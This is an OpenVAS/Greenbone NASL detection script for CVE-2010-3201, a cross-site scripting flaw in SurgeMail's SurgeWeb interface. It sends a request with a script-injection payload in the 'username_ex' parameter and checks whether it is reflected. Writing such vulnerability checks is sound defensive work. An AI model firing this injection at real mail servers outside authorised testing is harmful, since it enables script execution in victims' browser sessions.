# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:netwin:surgemail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801808");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-01-18 07:48:41 +0100 (Tue, 18 Jan 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2010-3201");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SurgeMail < 4.3g XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_surgemail_consolidation.nasl");
  script_mandatory_keys("surgemail/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"SurgeMail is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'username_ex' parameter to the SurgeWeb interface '/surgeweb', which allows attackers to
  execute arbitrary HTML and script code in a user's browser session in the context of an affected
  site.");

  script_tag(name:"impact", value:"Successful exploitation will allows to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the context of an affected
  site.");

  script_tag(name:"affected", value:"SurgeMail prior to version 4.3g.");

  script_tag(name:"solution", value:"Update to version 4.3g or later.");

  script_xref(name:"URL", value:"http://ictsec.se/?p=108");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43679");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/514115/100/0/threaded");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = '/surgeweb?username_ex="/><script>alert(\'VT-XSS-Test\')</script>';

if (http_vuln_check(port: port, url: url, pattern: "<script>alert\('VT-XSS-Test'\)</script>",
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
